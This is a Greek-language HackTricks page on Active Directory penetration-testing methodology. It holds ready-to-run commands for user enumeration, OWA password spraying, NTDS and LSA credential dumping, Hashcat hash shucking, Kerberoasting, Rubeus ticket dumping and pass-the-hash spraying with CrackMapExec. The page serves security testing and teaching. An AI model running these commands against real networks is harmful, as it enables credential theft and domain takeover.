# Active Directory Μεθοδολογία

{{#include ../../banners/hacktricks-training.md}}

## Βασική επισκόπηση

**Active Directory** λειτουργεί ως θεμελιώδης τεχνολογία, επιτρέποντας σε **network administrators** να δημιουργούν και να διαχειρίζονται αποτελεσματικά **domains**, **users**, και **objects** μέσα σε ένα δίκτυο. Είναι σχεδιασμένο να κλιμακώνεται, διευκολύνοντας την οργάνωση μεγάλου αριθμού χρηστών σε διαχειρίσιμες **groups** και **subgroups**, ενώ παράλληλα ελέγχει τα **access rights** σε διάφορα επίπεδα.

Η δομή του **Active Directory** αποτελείται από τρία κύρια στρώματα: **domains**, **trees**, και **forests**. Ένα **domain** περιλαμβάνει μια συλλογή αντικειμένων, όπως **users** ή **devices**, που μοιράζονται μια κοινή βάση δεδομένων. Τα **trees** είναι ομάδες αυτών των domains που συνδέονται με μια κοινή δομή, και ένα **forest** αντιπροσωπεύει τη συλλογή πολλαπλών trees, διασυνδεδεμένων μέσω **trust relationships**, σχηματίζοντας το ανώτατο επίπεδο της οργανωτικής δομής. Συγκεκριμένα **access** και **communication rights** μπορούν να οριστούν σε κάθε ένα από αυτά τα επίπεδα.

Βασικές έννοιες στο **Active Directory** περιλαμβάνουν:

1. **Directory** – Περιέχει όλες τις πληροφορίες που αφορούν τα Active Directory objects.
2. **Object** – Αναφέρεται σε οντότητες μέσα στο directory, όπως **users**, **groups**, ή **shared folders**.
3. **Domain** – Λειτουργεί ως δοχείο για directory objects, με τη δυνατότητα πολλαπλά domains να συνυπάρχουν μέσα σε ένα **forest**, το καθένα διατηρώντας τη δική του συλλογή αντικειμένων.
4. **Tree** – Μια ομαδοποίηση domains που μοιράζονται ένα κοινό root domain.
5. **Forest** – Το ανώτατο επίπεδο της οργανωτικής δομής στο Active Directory, αποτελούμενο από διάφορα trees με **trust relationships** μεταξύ τους.

**Active Directory Domain Services (AD DS)** περιλαμβάνει μια σειρά υπηρεσιών κρίσιμων για την κεντρική διαχείριση και επικοινωνία εντός ενός δικτύου. Αυτές οι υπηρεσίες περιλαμβάνουν:

1. **Domain Services** – Κεντροποιεί την αποθήκευση δεδομένων και διαχειρίζεται τις αλληλεπιδράσεις μεταξύ **users** και **domains**, συμπεριλαμβανομένης της **authentication** και των λειτουργιών **search**.
2. **Certificate Services** – Επιβλέπει τη δημιουργία, διανομή και διαχείριση ασφαλών **digital certificates**.
3. **Lightweight Directory Services** – Υποστηρίζει εφαρμογές που βασίζονται σε directory μέσω του **LDAP protocol**.
4. **Directory Federation Services** – Παρέχει **single-sign-on** δυνατότητες για την πιστοποίηση χρηστών σε πολλαπλές web εφαρμογές σε μία συνεδρία.
5. **Rights Management** – Βοηθά στην προστασία υλικού με πνευματικά δικαιώματα, ρυθμίζοντας τη μη εξουσιοδοτημένη διανομή και χρήση του.
6. **DNS Service** – Καίριας σημασίας για την επίλυση **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Για να μάθετε πώς να **attack an AD** χρειάζεται να **understand** πολύ καλά τη **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

If you just have access to an AD environment but you don't have any credentials/sessions you could:

- **Pentest the network:**
- Σκανάρετε το δίκτυο, βρείτε μηχανήματα και ανοιχτές θύρες και δοκιμάστε να **exploit vulnerabilities** ή να **extract credentials** από αυτά (για παράδειγμα, [printers could be very interesting targets](ad-information-in-printers.md)).
- Η ανίχνευση του DNS μπορεί να δώσει πληροφορίες για βασικούς servers στο domain όπως web, printers, shares, vpn, media, κ.λπ.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Ρίξτε μια ματιά στην Γενική [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) για περισσότερες πληροφορίες σχετικά με το πώς να το κάνετε.
- **Check for null and Guest access on smb services** (this won't work on modern Windows versions):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- A more detailed guide on how to enumerate a SMB server can be found here:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- A more detailed guide on how to enumerate LDAP can be found here (pay **special attention to the anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Συλλέξτε credentials **impersonating services with Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Πρόσβαση σε host με [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Συλλογή credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Εξαγωγή usernames/ονόματων από εσωτερικά έγγραφα, social media, υπηρεσίες (κυρίως web) εντός των domain environments και επίσης από δημόσια διαθέσιμες πηγές.
- Εάν βρείτε τα πλήρη ονόματα εργαζομένων της εταιρείας, μπορείτε να δοκιμάσετε διάφορες AD **username conventions** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Οι πιο κοινές συμφωνίες είναι: _NameSurname_, _Name.Surname_, _NamSur_ (3letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Check the [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) and [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) pages.
- **Kerbrute enum**: When an **invalid username is requested** the server will respond using the **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, allowing us to determine that the username was invalid. **Valid usernames** will illicit either the **TGT in a AS-REP** response or the error _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicating that the user is required to perform pre-authentication.
- **No Authentication against MS-NRPC**: Using auth-level = 1 (No authentication) against the MS-NRPC (Netlogon) interface on domain controllers. The method calls the `DsrGetDcNameEx2` function after binding MS-NRPC interface to check if the user or computer exists without any credentials. The [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool implements this type of enumeration. The research can be found [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Αν βρήκατε έναν από αυτούς τους διακομιστές στο δίκτυο, μπορείτε επίσης να πραγματοποιήσετε **user enumeration εναντίον του**. Για παράδειγμα, μπορείτε να χρησιμοποιήσετε το εργαλείο [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Μπορείτε να βρείτε λίστες με ονόματα χρηστών στο [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) και σ' αυτό ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Ωστόσο, θα πρέπει να έχετε το **όνομα των ανθρώπων που εργάζονται στην εταιρεία** από το στάδιο recon που θα έπρεπε να είχατε εκτελέσει προηγουμένως. Με το όνομα και το επώνυμο μπορείτε να χρησιμοποιήσετε το script [**namemash.py**](https://gist.github.com/superkojiman/11076951) για να δημιουργήσετε πιθανά έγκυρα ονόματα χρηστών.

### Γνωρίζοντας ένα ή περισσότερα ονόματα χρήστη

Ok, οπότε ξέρετε ήδη ένα έγκυρο όνομα χρήστη αλλά δεν έχετε κωδικούς... Δοκιμάστε τα εξής:

- [**ASREPRoast**](asreproast.md): Αν ένας χρήστης **δεν έχει** το attribute _DONT_REQ_PREAUTH_ μπορείτε να **request a AS_REP message** για αυτόν τον χρήστη που θα περιέχει κάποια δεδομένα κρυπτογραφημένα με παράγωγο του password του χρήστη.
- [**Password Spraying**](password-spraying.md): Δοκιμάστε τους πιο **common passwords** με κάθε έναν από τους εντοπισμένους χρήστες — ίσως κάποιος χρήστης χρησιμοποιεί κακό password (έχετε υπόψη το password policy!).
- Σημειώστε ότι μπορείτε επίσης να **spray OWA servers** για να προσπαθήσετε να αποκτήσετε πρόσβαση στους mail servers των χρηστών.

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Μπορεί να είστε σε θέση να **obtain** κάποια challenge **hashes** για να τα **crack** μέσω **poisoning** κάποιων πρωτοκόλλων του **network**:

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Αν καταφέρατε να enumerate το Active Directory θα έχετε **περισσότερα emails και καλύτερη κατανόηση του network**. Μπορεί να καταφέρετε να επιβάλετε NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) για να αποκτήσετε πρόσβαση στο AD env.

### NetExec workspace-driven recon & relay posture checks

- Χρησιμοποιήστε τα **`nxcdb` workspaces** για να διατηρείτε το AD recon state ανά engagement: `workspace create <name>` δημιουργεί per-protocol SQLite DBs κάτω από `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Αλλάξτε προβολές με `proto smb|mssql|winrm` και απαριθμήστε τα συλλεχθέντα secrets με `creds`. Καθαρίστε χειροκίνητα ευαίσθητα δεδομένα όταν τελειώσετε: `rm -rf ~/.nxc/workspaces/<name>`.
- Γρήγορη ανακάλυψη υποδικτύου με **`netexec smb <cidr>`** αποκαλύπτει **domain**, **OS build**, **SMB signing requirements**, και **Null Auth**. Κόμβοι που εμφανίζουν `(signing:False)` είναι **relay-prone**, ενώ οι DCs συχνά απαιτούν signing.
- Δημιουργήστε **hostnames in /etc/hosts** απευθείας από το NetExec output για να διευκολύνετε το targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Όταν **SMB relay to the DC is blocked** by signing, εξακολουθήστε να ελέγχετε την κατάσταση του **LDAP**: `netexec ldap <dc>` εμφανίζει `(signing:None)` / weak channel binding. Ένας DC με απαιτούμενο SMB signing αλλά απενεργοποιημένο LDAP signing παραμένει ένας βιώσιμος στόχος **relay-to-LDAP** για καταχρήσεις όπως **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Τα printer/web UIs μερικές φορές **embed masked admin passwords in HTML**. Η προβολή του source/devtools μπορεί να αποκαλύψει cleartext (π.χ., `<input value="<password>">`), επιτρέποντας Basic-auth πρόσβαση σε scan/print repositories.
- Τα retrieved print jobs μπορεί να περιέχουν **plaintext onboarding docs** με per-user passwords. Κρατήστε τα pairings aligned όταν δοκιμάζετε:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Κλέψτε NTLM Creds

Αν μπορείτε να αποκτήσετε πρόσβαση σε άλλους υπολογιστές ή shares με τον null ή guest user, μπορείτε να τοποθετήσετε αρχεία (π.χ. ένα SCF file) που αν ανοιχτούν θα προκαλέσουν μια NTLM αυθεντικοποίηση εις βάρος σας ώστε να κλέψετε το NTLM challenge για να το crackάρετε:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

Το **Hash shucking** αντιμετωπίζει κάθε NT hash που ήδη διαθέτετε ως υποψήφιο password για άλλα, πιο αργά formats των οποίων το key material προέρχεται άμεσα από το NT hash. Αντί να brute-forceάρετε μεγάλες passphrases σε Kerberos RC4 tickets, NetNTLM challenges ή cached credentials, τροφοδοτείτε τα NT hashes στα NT-candidate modes του Hashcat και αφήνετε το εργαλείο να ελέγξει reuse χωρίς ποτέ να μάθει το plaintext. Αυτό είναι ιδιαίτερα αποδοτικό μετά από compromise domain όπου μπορείτε να συλλέξετε χιλιάδες τρέχοντα και ιστορικά NT hashes.

Χρησιμοποιήστε shucking όταν:

- Έχετε ένα NT corpus από DCSync, SAM/SECURITY dumps, ή credential vaults και χρειάζεται να ελέγξετε reuse σε άλλα domains/forests.
- Καταγράφετε RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, ή DCC/DCC2 blobs.
- Θέλετε γρήγορα να αποδείξετε reuse για μεγάλες, μη-σπάσιμες passphrases και να pivotάρετε άμεσα μέσω Pass-the-Hash.

Η τεχνική **δεν δουλεύει** απέναντι σε encryption types των οποίων τα keys δεν είναι το NT hash (π.χ., Kerberos etype 17/18 AES). Εάν ένα domain επιβάλλει AES-only, πρέπει να επιστρέψετε στα κανονικά password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Χρησιμοποιήστε `secretsdump.py` με history για να τραβήξετε το μεγαλύτερο δυνατό σετ NT hashes (και τις προηγούμενες τιμές τους):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Τα history entries διευρύνουν δραματικά το candidate pool επειδή η Microsoft μπορεί να αποθηκεύσει έως 24 προηγούμενα hashes ανά λογαριασμό. Για περισσότερους τρόπους συγκομιδής NTDS secrets δείτε:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ή Mimikatz `lsadump::sam /patch`) εξάγει τοπικά SAM/SECURITY δεδομένα και cached domain logons (DCC/DCC2). Αφαιρέστε duplicates και προσθέστε αυτά τα hashes στο ίδιο `nt_candidates.txt` λίστα.
- **Track metadata** – Κρατήστε το username/domain που παρήγαγε κάθε hash (ακόμα κι αν το wordlist περιέχει μόνο hex). Τα matching hashes σας δείχνουν αμέσως ποιος principal κάνει reuse όταν το Hashcat τυπώσει το winning candidate.
- Προτιμήστε candidates από το ίδιο forest ή από trusted forest· αυτό μεγιστοποιεί την πιθανότητα overlap όταν shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Σημειώσεις:

- Τα NT-candidate inputs **πρέπει να παραμείνουν raw 32-hex NT hashes**. Απενεργοποιήστε rule engines (όχι `-r`, όχι hybrid modes) γιατί το mangling καταστρέφει το candidate key material.
- Αυτά τα modes δεν είναι εγγενώς πιο γρήγορα, αλλά το NTLM keyspace (~30,000 MH/s σε ένα M3 Max) είναι ~100× γρηγορότερο από Kerberos RC4 (~300 MH/s). Το να δοκιμάσετε μια επιμελημένη λίστα NT είναι πολύ φθηνότερο από το να εξερευνήσετε ολόκληρο το password space στο αργό format.
- Πάντα τρέχετε το **τελευταίο Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) γιατί τα modes 31500/31600/35300/35400 κυκλοφόρησαν πρόσφατα.
- Αυτή τη στιγμή δεν υπάρχει NT mode για AS-REQ Pre-Auth, και τα AES etypes (19600/19700) απαιτούν το plaintext password επειδή τα keys τους προέρχονται μέσω PBKDF2 από UTF-16LE passwords, όχι από raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture ένα RC4 TGS για ένα target SPN με έναν low-privileged user (δείτε τη σελίδα Kerberoast για λεπτομέρειες):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck το ticket με τη λίστα NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Το Hashcat παράγει το RC4 key από κάθε NT candidate και επικυρώνει το `$krb5tgs$23$...` blob. Ένα match επιβεβαιώνει ότι ο service account χρησιμοποιεί ένα από τα υπάρχοντα NT hashes σας.

3. Pivotάρετε άμεσα μέσω PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Προαιρετικά μπορείτε να ανακτήσετε το plaintext αργότερα με `hashcat -m 1000 <matched_hash> wordlists/` αν χρειαστεί.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons από έναν compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Αντιγράψτε τη γραμμή DCC2 για τον ενδιαφέρον domain user στο `dcc2_highpriv.txt` και shuckάρετέ το:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Ένα επιτυχημένο match επιστρέφει το NT hash που ήδη είναι γνωστό στη λίστα σας, αποδεικνύοντας ότι ο cached user κάνει reuse password. Χρησιμοποιήστε το απευθείας για PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ή brute-forceάρετέ το σε fast NTLM mode για να ανακτήσετε το string.

Το ακριβώς ίδιο workflow εφαρμόζεται σε NetNTLM challenge-responses (`-m 27000/27100`) και DCC (`-m 31500`). Μόλις ταυτοποιηθεί ένα match μπορείτε να ξεκινήσετε relay, SMB/WMI/WinRM PtH, ή να re-crackάρετε το NT hash με masks/rules offline.

## Enumerating Active Directory WITH credentials/session

Για αυτή τη φάση χρειάζεται να έχετε **compromised τα credentials ή μια session ενός έγκυρου domain account.** Αν έχετε κάποια έγκυρα credentials ή ένα shell ως domain user, **θα πρέπει να θυμάστε ότι οι προηγούμενες επιλογές είναι ακόμα διαθέσιμες για να compromisere άλλους users.**

Πριν ξεκινήσετε την authenticated enumeration πρέπει να ξέρετε τι είναι το **Kerberos double hop problem.**

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Το να έχετε compromised έναν account είναι ένα **μεγάλο βήμα για να αρχίσετε να compromisere ολόκληρο το domain**, γιατί θα μπορείτε να ξεκινήσετε την **Active Directory Enumeration:**

Σχετικά με [**ASREPRoast**](asreproast.md) τώρα μπορείτε να βρείτε κάθε πιθανό vulnerable user, και σχετικά με [**Password Spraying**](password-spraying.md) μπορείτε να πάρετε μια **λίστα με όλα τα usernames** και να δοκιμάσετε το password του compromised account, κενά passwords και νέες υποσχόμενες παραλλαγές.

- Μπορείτε να χρησιμοποιήσετε το [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Μπορείτε επίσης να χρησιμοποιήσετε [**powershell for recon**](../basic-powershell-for-pentesters/index.html) το οποίο θα είναι πιο stealthy
- Μπορείτε επίσης να [**use powerview**](../basic-powershell-for-pentesters/powerview.md) για να εξάγετε πιο λεπτομερείς πληροφορίες
- Ένα ακόμη εξαιρετικό εργαλείο για recon σε Active Directory είναι το [**BloodHound**](bloodhound.md). Δεν είναι **πολύ stealthy** (ανάλογα με τις μεθόδους συλλογής που χρησιμοποιείτε), αλλά **αν δεν σας νοιάζει** δοκιμάστε το. Βρείτε που οι χρήστες μπορούν να κάνουν RDP, βρείτε paths προς άλλα groups, κ.λπ.
- **Άλλα αυτοματοποιημένα AD enumeration εργαλεία είναι:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) καθώς μπορεί να περιέχουν ενδιαφέρουσες πληροφορίες.
- Ένα **GUI tool** που μπορείτε να χρησιμοποιήσετε για να enumerate το directory είναι **AdExplorer.exe** από τη συλλογή **SysInternal**.
- Μπορείτε επίσης να αναζητήσετε στη βάση LDAP με **ldapsearch** για credentials σε πεδία _userPassword_ & _unixUserPassword_, ή ακόμα και στο _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) για άλλες μεθόδους.
- Αν χρησιμοποιείτε **Linux**, μπορείτε επίσης να enumerate το domain χρησιμοποιώντας [**pywerview**](https://github.com/the-useless-one/pywerview).
- Μπορείτε επίσης να δοκιμάσετε αυτοματοποιημένα εργαλεία όπως:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Εξαγωγή όλων των domain users**

Είναι πολύ εύκολο να αποκτήσετε όλα τα domain usernames από τα Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). Σε Linux, μπορείτε να χρησιμοποιήσετε: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ή `enum4linux -a -u "user" -p "password" <DC IP>`

> Ακόμα κι αν αυτή η ενότητα Enumeration φαίνεται μικρή, είναι το πιο σημαντικό μέρος απ' όλα. Επισκεφτείτε τα links (κυρίως τα cmd, powershell, powerview και BloodHound), μάθετε πώς να enumerate ένα domain και εξασκηθείτε μέχρι να νιώσετε άνετα. Κατά τη διάρκεια ενός assessment, αυτή θα είναι η κρίσιμη στιγμή για να βρείτε το δρόμο σας προς DA ή να αποφασίσετε ότι δεν μπορεί να γίνει τίποτα.

### Kerberoast

Το Kerberoasting περιλαμβάνει την απόκτηση **TGS tickets** που χρησιμοποιούνται από services δεμένα με user accounts και το cracking της κρυπτογράφησής τους—η οποία βασίζεται σε user passwords—**offline**.

Περισσότερα σχετικά σε:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Μόλις έχετε αποκτήσει credentials μπορείτε να ελέγξετε αν έχετε πρόσβαση σε κάποια **μηχανή**. Για αυτό μπορείτε να χρησιμοποιήσετε **CrackMapExec** για να δοκιμάσετε σύνδεση σε πολλούς servers με διάφορα πρωτόκολλα, σύμφωνα με τα αποτελέσματα των port scans σας.

### Local Privilege Escalation

Αν έχετε compromised credentials ή μια session ως ένας κανονικός domain user και έχετε **πρόσβαση** με αυτόν τον χρήστη σε **οποιαδήποτε μηχανή στο domain**, καλό είναι να προσπαθήσετε να βρείτε τρόπο να **εκτοξεύσετε προνόμια τοπικά και να lootάρετε credentials**. Μόνο με local administrator privileges θα μπορείτε να **dumpάρετε hashes άλλων χρηστών** στη μνήμη (LSASS) και τοπικά (SAM).

Υπάρχει ολοκληρωμένη σελίδα σε αυτό το βιβλίο για [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) και ένα [**checklist**](../checklist-windows-privilege-escalation.md). Επίσης, μην ξεχάσετε να χρησιμοποιήσετε [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Είναι πολύ **ανοικτό** να βρείτε **tickets** στο current user που σας δίνουν permission να έχετε πρόσβαση σε απροσδόκητους πόρους, αλλά μπορείτε να ελέγξετε:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Αν καταφέρατε να κάνετε enumeration του active directory θα έχετε **περισσότερα emails και καλύτερη κατανόηση του δικτύου**. Ίσως να μπορέσετε να εξαναγκάσετε NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Τώρα που έχετε κάποια basic credentials πρέπει να ελέγξετε αν μπορείτε να **βρείτε** οποιαδήποτε **ενδιαφέροντα αρχεία που μοιράζονται μέσα στο AD**. Μπορείτε να το κάνετε χειροκίνητα αλλά είναι πολύ βαρετό και επαναλαμβανόμενο καθήκον (ειδικά αν βρείτε εκατοντάδες docs που πρέπει να ελέγξετε).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Αν μπορείτε να έχετε πρόσβαση σε άλλους PCs ή shares μπορείτε να τοποθετήσετε αρχεία (like a SCF file) που, αν κάπως προσπελαστούν, θα trigger an NTLM authentication against you ώστε να μπορείτε να steal το **NTLM challenge** για να το crack:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Αυτή η ευπάθεια επέτρεπε σε οποιονδήποτε authenticated user να **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Κλιμάκωση προνομίων σε Active Directory ΜΕ privileged credentials/session

**Για τις παρακάτω τεχνικές ένας απλός domain user δεν αρκεί, χρειάζεστε κάποια ειδικά privileges/credentials για να πραγματοποιήσετε αυτές τις επιθέσεις.**

### Hash extraction

Ελπίζουμε να καταφέρατε να **compromise some local admin** account χρησιμοποιώντας [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Στη συνέχεια, είναι ώρα να dump όλα τα hashes από τη μνήμη και τοπικά.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Μόλις έχετε το hash ενός χρήστη**, μπορείτε να το χρησιμοποιήσετε για να τον impersonate.\
Χρειάζεται να χρησιμοποιήσετε κάποιο tool που θα perform την NTLM authentication χρησιμοποιώντας αυτό το hash, **ή** μπορείτε να δημιουργήσετε ένα νέο sessionlogon και να inject αυτό το hash μέσα στο LSASS, ώστε όταν γίνει οποιαδήποτε NTLM authentication, να χρησιμοποιηθεί αυτό το hash. Η τελευταία επιλογή είναι αυτή που κάνει το mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Αυτή η επίθεση στοχεύει να χρησιμοποιήσει το user NTLM hash για να αιτηθεί Kerberos tickets, ως εναλλακτική στο κοινό Pass The Hash πάνω από το NTLM πρωτόκολλο. Συνεπώς, αυτό μπορεί να είναι ιδιαίτερα χρήσιμο σε δίκτυα όπου το NTLM protocol είναι απενεργοποιημένο και μόνο το Kerberos επιτρέπεται ως authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Στη μέθοδο επίθεσης Pass The Ticket (PTT), οι επιτιθέμενοι steal το authentication ticket ενός χρήστη αντί για το password ή τις hash τιμές του. Αυτό το stolen ticket στη συνέχεια χρησιμοποιείται για να impersonate τον χρήστη, αποκτώντας μη εξουσιοδοτημένη πρόσβαση σε resources και services μέσα σε ένα δίκτυο.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Αν έχετε το hash ή το password ενός local administrator πρέπει να δοκιμάσετε να κάνετε login τοπικά σε άλλους PCs με αυτό.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
